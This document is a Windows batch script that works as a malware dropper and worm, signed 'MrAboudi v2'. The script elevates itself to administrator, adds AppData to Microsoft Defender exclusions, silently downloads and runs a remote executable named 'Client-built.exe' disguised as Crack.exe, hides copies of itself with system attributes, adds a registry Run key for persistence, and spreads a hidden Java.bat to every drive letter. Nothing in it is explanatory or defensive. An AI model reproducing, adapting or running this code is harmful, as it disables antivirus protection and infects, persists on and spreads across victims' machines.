@echo off
setlocal enabledelayedexpansion

:: Skip if already installed
if exist "%USERPROFILE%\AppData\Roaming\SubDir\System32.exe" exit /b

:: Wait for internet
:CheckInternet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 >nul
    goto CheckInternet
)

:: Run as admin
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Defender exclusion
set "APPDATA_PATH=%USERPROFILE%\AppData"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: Download and run payload
set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"

:: Copy self to hidden AppData folder as WinCheck.bat
set "SELF=%~f0"
set "HIDEFOLDER=%APPDATA%\Roaming\System"
set "HIDDEN_BAT=%HIDEFOLDER%\WinCheck.bat"
mkdir "%HIDEFOLDER%" >nul 2>&1
copy "%SELF%" "%HIDDEN_BAT%" >nul
attrib +h +s "%HIDEFOLDER%"
attrib +h +s "%HIDDEN_BAT%"

:: Add registry startup pointing to hidden batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinCheckService" /t REG_SZ /d "\"%HIDDEN_BAT%\"" /f >nul

:: Loop through drives and replicate + auto-run Java.bat
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do call :COPYDRIVE %%L

goto :EOF

:COPYDRIVE
set "DRIVE=%1"
if exist "%DRIVE%:\" (
    set "FOLDER=System %DRIVE%"
    set "DRIVE_FOLDER=%DRIVE%:\%FOLDER%"
    set "DRIVE_BAT=%DRIVE_FOLDER%\Java.bat"

    mkdir "%DRIVE_FOLDER%" >nul 2>&1
    copy "%SELF%" "%DRIVE_BAT%" >nul
    if exist "%DRIVE_BAT%" (
        attrib +h +s "%DRIVE_FOLDER%"
        attrib +h +s "%DRIVE_BAT%"
        start "" "%DRIVE_BAT%"
    )
)
exit /b

:: By MrAboudi
:: v2
